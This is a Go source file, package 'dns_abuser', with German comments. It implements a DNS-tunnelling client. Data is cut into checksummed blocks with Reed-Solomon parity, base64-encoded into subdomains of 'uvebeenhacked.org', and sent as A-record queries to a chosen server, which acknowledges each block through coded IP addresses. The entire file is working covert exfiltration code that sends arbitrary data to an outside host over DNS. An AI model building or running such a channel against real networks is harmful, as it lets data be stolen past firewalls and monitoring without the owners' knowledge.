package dns_abuser

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"github.com/klauspost/reedsolomon"
	"github.com/miekg/dns"
	"hash/crc32"
	"math"
	"strconv"
	"strings"
)

func SendInitialBlock(count int32, host string, retry int) error {
	parityBlocksCount := int32(math.Ceil(float64(count) * 0.25))
	data := make([]byte, 1+4+4)

	binary.BigEndian.PutUint32(data[1:5], uint32(count))
	binary.BigEndian.PutUint32(data[5:9], uint32(parityBlocksCount))

	data = appendChecksum(data)

	fmt.Printf("Initial Block: %0x %0x %0x %0x\n", data[0], data[1:5], data[5:9], data[9:])

	subdomain := encodeToBase64(data)

	var err error
	for ret := 0; ret < retry; ret++ {
		err = sendRequest(subdomain, host)
		_ = subdomain
		if err != nil {
			continue
		}
		break
	}
	if err != nil {
		return err
	}

	return nil
}

func SendData(d []byte, blockLength, blockNum int, host string, retry int) error {
	data := make([]byte, 1+blockLength)
	copy(data[1:len(d)+1], d)
	data[0] = uint8(blockNum)

	data = appendChecksum(data)

	fmt.Printf("%0x\n", data)

	subdomain := encodeToBase64(data)

	var err error
	for ret := 0; ret < retry; ret++ {
		err = sendRequest(subdomain, host)
		if err != nil {
			continue
		}
		break
	}
	if err != nil {
		return err
	}

	return nil
}

func SendReedSolomonBlocks(data []byte, estimatedSize int, host string) error {
	dataBlockCount := int(math.Ceil(float64(len(data)) / float64(estimatedSize)))
	blockLength := int(math.Ceil(float64(len(data)) / float64(dataBlockCount)))
	parityBlocksCount := int(math.Ceil(float64(dataBlockCount) * 0.25))

	blocks, err := reedSolomon(data, blockLength, dataBlockCount, parityBlocksCount)
	if err != nil {
		return err
	}

	for i := 0; i < len(blocks); i++ {
		subdomain := encodeToBase64(append([]byte{uint8(dataBlockCount + 1 + i)}, blocks[i]...))
		err = sendRequest(subdomain, host)
		if err != nil {
			return err
		}
	}

	return nil
}

func encodeToBase64(data []byte) string {
	sub := base64.URLEncoding.EncodeToString(data)
	var subdomain string
	for i, r := range sub {
		subdomain += string(r)
		if (i+1)%60 == 0 && i != len(sub)-1 {
			subdomain += "."
		}
	}
	return subdomain
}

func mask(d []byte) []byte {
	data := make([]byte, len(d))
	copy(data, d)

	for i := 0; i < len(data); i++ {
		if data[i] == 0xff {
			data = append(data[:i], append([]byte{0xff}, data[i:]...)...)
			i++
		}
	}

	data = append([]byte{0xff}, append(data, 0xff)...)

	return data
}

func appendChecksum(d []byte) []byte {
	data := make([]byte, len(d)+4)
	copy(data[:len(d)], d)

	crc := crc32.ChecksumIEEE(d)
	binary.BigEndian.PutUint32(data[len(d):], crc)

	return data
}

func reedSolomon(data []byte, l, n, m int) ([][]byte, error) {

	blocks := make([][]byte, n+m)
	for i := 0; i < len(blocks); i++ {
		blocks[i] = make([]byte, l)
	}
	for i := 0; i < len(data); i++ {
		blockIndex := i / l
		byteIndex := i % l
		blocks[blockIndex][byteIndex] = data[i]
	}

	enc, err := reedsolomon.New(n, m)
	if err != nil {
		return nil, err
	}
	err = enc.Encode(blocks)
	if err != nil {
		return nil, err
	}

	return blocks[n:], nil
}

func sendRequest(sub, host string) error {
	domain := fmt.Sprintf("%s.uvebeenhacked.org.", sub)

	fmt.Println("Send:", domain)

	// Erstellen einer neuen DNS-Nachricht
	m := new(dns.Msg)
	m.SetQuestion(domain, dns.TypeA) // A-Record-Abfrage

	// DNS-Client konfigurieren und Ziel-DNS-Server festlegen
	client := new(dns.Client)

	// Senden der Anfrage an den festgelegten DNS-Server
	response, _, err := client.Exchange(m, fmt.Sprintf("%s:%d", host, 53))
	if err != nil {
		return err
	}

	// Verarbeiten der Antwort
	for _, ans := range response.Answer {
		if aRecord, ok := ans.(*dns.A); ok {
			fmt.Printf("Antwort: %s -> %s\n", domain, aRecord.A.String())
			answer := strings.Split(aRecord.A.String(), ".")
			if len(answer) != 4 {
				return fmt.Errorf("recieved ip has incorrect format")
			}
			if answer[0] == "85" && answer[1] == "143" && answer[2] == "80" {
				block, err := strconv.Atoi(answer[3])
				if err != nil {
					return err
				}
				fmt.Printf("Block %d ok\n", block)
			} else if answer[0] == "47" && answer[1] == "81" && answer[2] == "64" {
				block, err := strconv.Atoi(answer[3])
				if err != nil {
					return err
				}
				fmt.Printf("Block %d incorrect\n", block)
			} else {
				return fmt.Errorf("recieved ip not recongnisable")
			}
		}
	}

	return nil
}
